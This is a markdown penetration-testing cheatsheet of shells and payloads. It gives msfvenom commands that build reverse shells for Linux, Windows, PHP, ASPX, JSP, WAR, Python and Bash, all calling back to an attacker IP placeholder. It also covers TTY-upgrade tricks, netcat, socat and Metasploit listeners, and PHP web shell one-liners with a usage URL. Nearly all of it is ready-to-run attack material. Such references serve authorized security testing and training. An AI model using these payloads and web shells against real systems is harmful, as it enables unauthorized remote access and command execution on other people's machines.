# 🐚 Shells & Payloads Cheatsheet

## 🕷️ Msfvenom Payloads
Generate reverse shells for various platforms.

### Linux
```bash
# Linux x64 Reverse TCP (Stageless)
msfvenom -p linux/x64/shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=<PORT> -f elf -o shell.elf

# Linux x86 Reverse TCP (Staged)
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<ATTACKER_IP> LPORT=<PORT> -f elf -o shell.elf
```

### Windows
```bash
# Windows x64 Reverse TCP (Stageless)
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=<PORT> -f exe -o shell.exe

# Windows x64 Meterpreter (Staged)
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<ATTACKER_IP> LPORT=<PORT> -f exe -o shell.exe
```

### Web Payloads
```bash
# PHP
msfvenom -p php/reverse_php LHOST=<ATTACKER_IP> LPORT=<PORT> -f raw > shell.php

# ASPX
msfvenom -p windows/shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=<PORT> -f aspx > shell.aspx

# JSP
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=<PORT> -f raw > shell.jsp

# WAR
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=<PORT> -f war > shell.war
```

### Scripting
```bash
# Python
msfvenom -p cmd/unix/reverse_python LHOST=<ATTACKER_IP> LPORT=<PORT> -f raw > shell.py

# Bash
msfvenom -p cmd/unix/reverse_bash LHOST=<ATTACKER_IP> LPORT=<PORT> -f raw > shell.sh
```

---

## 🆙 Shell Spawning (TTY Upgrade)
Turn a dumb shell into a fully interactive TTY.

### Python Method (Most Common)
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# OR
python -c 'import pty; pty.spawn("/bin/bash")'
```

### The "Magic" Upgrade (Ctrl+Z)
1. Get a shell (e.g., via netcat).
2. Background it: `Ctrl + Z`
3. In your local terminal:
   ```bash
   stty raw -echo; fg
   ```
4. Press `Enter` twice.
5. `export TERM=xterm`

### Script Method
```bash
/usr/bin/script -qc /bin/bash /dev/null
```

---

## 👂 Listeners

### Netcat
```bash
nc -lvnp <PORT>
```

### Socat (Better stability)
```bash
socat file:`tty`,raw,echo=0 tcp-listen:<PORT>
```

### Metasploit Multi/Handler
```bash
msfconsole -q -x "use exploit/multi/handler; set PAYLOAD <PAYLOAD_NAME>; set LHOST <ATTACKER_IP>; set LPORT <PORT>; run"
```

---

## 🕸️ Web Shell One-Liners

### PHP
```php
<?php system($_GET['cmd']); ?>
```
**Usage:** `http://target.com/shell.php?cmd=id`

### PHP (Exec)
```php
<?php echo shell_exec($_GET['cmd']); ?>
```
